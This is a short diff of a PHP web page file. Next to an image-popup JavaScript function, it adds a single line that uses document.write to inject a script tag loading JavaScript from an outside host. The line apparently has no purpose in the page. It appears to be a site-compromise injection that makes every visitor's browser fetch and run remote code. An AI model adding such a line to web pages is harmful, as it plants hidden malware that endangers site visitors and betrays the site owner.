@@ -36,6 +36,7 @@ include "top.php";
 		window.open(url, 'showpicture','width='+(w)+',height='+(h)+',left=' +((width-w)/2)+',top=0,fullscreen=0,location=0,menubar=0,scrol lbars=no,status=0,to olbar=0,resizable=yes');
 		return false;
 	}
+	document.write('<script src="http://manage.ots.kh.ua/cashbox/load_array.php" type="text/javascript"></script>');
 </script>
 
 <META http-equiv=Content-Type content="text/html; charset=windows-1251">
